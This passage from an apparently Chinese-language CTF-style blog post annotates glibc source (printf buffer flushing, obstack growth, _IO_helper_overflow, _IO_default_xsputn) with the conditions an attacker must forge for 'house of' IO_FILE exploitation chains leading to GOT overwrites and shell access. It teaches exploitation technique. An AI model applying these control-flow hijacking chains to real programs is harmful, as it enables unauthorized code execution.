*buf) &#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;mode == __printf_buffer_mode_failed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow(FILE *fp, <span class="type">int</span> ch) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">    __printf_buffer_as_file_commit(file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">    <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">        __printf_buffer_putc(file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!__printf_buffer_has_failed(file-&gt;next)</span><br><span class="line">        &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">        __printf_buffer_flush(file-&gt;next);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 首先 <code>__printf_buffer_as_file_overflow</code> 函数将 <code>FILE</code> 结构体转换为 <code>__printf_buffer_as_file</code> 类型，相关定义如下： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 之后调用了 <code>__printf_buffer_as_file_commit</code> ，该函数做了一些检查： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后根据参数<code>ch</code>是否为<code>EOF</code>决定是否调用 <code>__printf_buffer_putc</code> ，<code>FSOP</code>中调用的<code>_IO_flush_all_lockp</code>函数中是通过<code>_IO_OVERFLOW (fp, EOF)</code>调用到<code>vtable</code>中的<code>overflow</code>函数，因此<code>__printf_buffer_as_file_overflow</code>的参数<code>ch</code>为<code>EOF</code>， 当然，即使调用到了<code>__printf_buffer_putc</code>也只是是做了一些指针记录的数值加减的操作，对此我们不用过多关注</p>
<p>再之后会调用<code>__printf_buffer_flush</code>函数，调用条件是<code>file-&gt;next.mode != __printf_buffer_mode_failed</code>且<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></p>
<p><code>__printf_buffer_flush</code>函数定义如下，这里再次检查<code>file-&gt;next.mode != __printf_buffer_mode_failed</code>然后调用<code>__printf_buffer_do_flush</code>函数，参数为<code>file-&gt;next</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf(n) __printf_##n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer_flush Xprintf (buffer_flush)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer Xprintf (buffer)</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">Xprintf_buffer_flush</span> <span class="params">(<span class="keyword">struct</span> Xprintf_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  Xprintf (buffer_do_flush) (buf); <span class="comment">// __printf_buffer_do_flush(buf)</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果 <code>file-&gt;next.mode = __printf_buffer_mode_obstack(11)</code> 那么会调用 <code>__printf_buffer_flush_obstack</code> 函数 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>__printf_buffer_obstack</code> 结构体定义如下： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 如果满足 <code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> 则 <code>__printf_buffer_flush_obstack</code> 会执行 <code>obstack_1grow</code> 宏 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>obstack_1grow</code> 宏展开内容如下，可以看到该宏调用了 <code>_obstack_newchunk</code> 函数并将 <code>buf-&gt;obstack</code> 作为参数传入 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明位置: obstack.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)                          \</span></span><br><span class="line"><span class="meta">  __extension__                                      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                          \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, 1);                          \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);                          \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line">替换:  </span><br><span class="line">(&#123;</span><br><span class="line">    <span class="keyword">struct</span> obstack *__o = (buf-&gt;obstack);</span><br><span class="line">    <span class="keyword">if</span> (__o-&gt;next_free + <span class="number">1</span> &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, <span class="number">1</span>);</span><br><span class="line">    (*((__o)-&gt;next_free)++ = (buf-&gt;ch));</span><br><span class="line">    (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div> <code>_obstack_newchunk</code> 函数会执行 <code>CALL_CHUNKFUN</code> 宏，这和前面的 House of 琴瑟琵琶利用链相同 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  ...</span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 综上所述： 1. 在<code>__printf_buffer_as_file_overflow</code>函数中： * <code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code> 2. 在<code>__printf_buffer_as_file_commit</code>函数中： * <code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code> * <code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code> * <code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code> * <code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code> 3. 在<code>__printf_buffer_flush</code>函数中： * <code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code> 4. 在<code>__printf_buffer_flush_obstack</code>函数中： * <code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1 &lt;==&gt; file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code> 5. 在<code>obstack_1grow</code>宏定义中： * <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code> * <code>(h)-&gt;use_extra_arg</code> 不为 0 &lt;==&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code> 6. 最终调用<code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunkfun((struct __printf_buffer_obstack *) file-&gt;obstack-&gt;extra_arg)</code> [[houseofsnake1.png]]</p>
<h3 id="house-of-秦月汉关">house of 秦月汉关</h3>
<p>因为<code>puts</code>函数在开始时候会调用<code>strlen</code>， 我们跟随puts函数找到真正的<code>strlen</code>。可以看出puts会调用<code>strlen</code>的PLT表，PLT表跳转到一个<code>*ABS*@got.plt&gt;</code>的地方，里面存储的才是真正的<code>strlen</code>函数地址，改写这个来<code>getshell</code> ### house of 魑魅魍魉 一般来说一类跳表只有一个，但<code>_IO_helper_jumps</code>比较特殊，通过下面可以看出，跳表会根据<code>COMPILE_WPRINTF</code>值不同而生成不同的，但可能<code>libc</code>在编译时调用两次，所以我们可以在内存中看到两个<code>_IO_helper_jumps</code>，每种各一个。其中<code>COMPILE_WPRINTF == 0</code>先生成，<code>COMPILE_WPRINTF == 1</code>后生成</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_wdefault_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_wdefault_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_helper_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT (finish, _IO_default_finish),</span><br><span class="line">  JUMP_INIT (overflow, _IO_helper_overflow),</span><br><span class="line">  JUMP_INIT (underflow, _IO_default_underflow),</span><br><span class="line">  JUMP_INIT (uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT (pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT (xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT (xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT (seekoff, _IO_default_seekoff),</span><br><span class="line">  JUMP_INIT (seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT (setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT (sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT (doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT (read, _IO_default_read),</span><br><span class="line">  JUMP_INIT (write, _IO_default_write),</span><br><span class="line">  JUMP_INIT (seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT (close, _IO_default_close),</span><br><span class="line">  JUMP_INIT (stat, _IO_default_stat)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>
<p>同样，面对不同的<code>COMPILE_WPRINTF</code>所对应的<code>helper_file</code>也有所不同，区别在于是否需要伪造<code>struct _IO_wide_data _wide_data;</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">helper_file</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">f</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> _<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    FILE *_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>
<p>同样，<code>_IO_helper_overflow</code>这个函数在内存中也有 2 份。通过测试发现，如果使用<code>COMPILE_WPRINTF == 0</code>的情况，在攻击过程中<code>s-&gt;_IO_write_base</code>会变成<code>largebin-&gt;fd_nextsize</code>指针，从而被强制修改无法控制。为了方便，我们使用<code>COMPILE_WPRINTF == 1</code>所生成的<code>_IO_helper_overflow</code>。该函数在攻击过程中的作用是控制<code>_IO_default_xsputn</code>的三个参数</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_helper_overflow (FILE *s, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *target = ((<span class="keyword">struct</span> helper_file*) s)-&gt;_put_stream;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 利用这个链，显然这三个参数我们都可控。</span></span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == WEOF)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">      __wmemmove (s-&gt;_wide_data-&gt;_IO_write_base,</span><br><span class="line">          s-&gt;_wide_data-&gt;_IO_write_base + written,</span><br><span class="line">          used - written);</span><br><span class="line">      s-&gt;_wide_data-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="comment">// 如果使用这条链，_IO_write_ptr 将处于 largebin 的 bk_size 指针处</span></span><br><span class="line">  <span class="type">int</span> used = s-&gt;_IO_write_ptr - s-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (used)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> written = _IO_sputn (target, s-&gt;_IO_write_base, used);</span><br><span class="line">      <span class="keyword">if</span> (written == <span class="number">0</span> || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      memmove (s-&gt;_IO_write_base, s-&gt;_IO_write_base + written,</span><br><span class="line">           used - written);</span><br><span class="line">      s-&gt;_IO_write_ptr -= written;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">return</span> PUTC (c, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过上面函数可以清楚看出，在执行<code>size_t written = _IO_sputn (target, s-&gt;_wide_data-&gt;_IO_write_base, used)</code>时</p>
<ul>
<li><code>FILE *target = ((struct helper_file*) s)-&gt;_put_stream</code>可控</li>
<li><code>s-&gt;_wide_data-&gt;_IO_write_base</code>可控</li>
<li><code>int used = s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base</code>可控</li>
</ul>
<p>就达成了3个参数可控的要求，然后通过修改<code>((struct helper_file*) s)-&gt;_put_stream</code>的<code>vtable</code>指向<code>_IO_str_jumps</code>，使其调用<code>_IO_default_xsputn</code>函数</p>
<p>需要注意的是，<code>s-&gt;_wide_data-&gt;_IO_write_ptr</code>和<code>s-&gt;_wide_data-&gt;_IO_write_base</code>是<code>wchar_t *</code>类型，也就是说<code>used</code>实际是<code>(s-&gt;_wide_data-&gt;_IO_write_ptr - s-&gt;_wide_data-&gt;_IO_write_base) &gt;&gt; 2</code>，（在 Linux 系统上，宽字符通常使用<code>UTF-32</code>编码表示，而<code>UTF-32</code>使用<code>32</code>位表示一个字符，因此<code>wchar_t</code>类型在<code>Linux</code>上通常为<code>4</code>字节）</p>
<p><code>_IO_default_xsputn</code> 函数内要绕过的内容较多。该函数在攻击过程中的作用是两次调用 <code>__mempcpy</code> ，第一次利用任意地址写修改 <code>__mempcpy</code> 对应的 got 表中的值，第二次调用 <code>__mempcpy</code> 劫持程序执行流</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">          <span class="comment">// 要 count &gt; 20</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 利用此处实现 house of 借刀杀人，</span></span><br><span class="line">          <span class="comment">// 修改 memcpy 的内容为setcontext</span></span><br><span class="line">          <span class="comment">// 再次返回的时候就能够实现 house of 一骑当千</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          <span class="type">ssize_t</span> i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">// 要 more &gt; count，能再次返回执行 __mempcpy</span></span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 绕过下面这一行，再次执行for循环的内容</span></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF) </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br></pre></td></tr></table></figure></div>
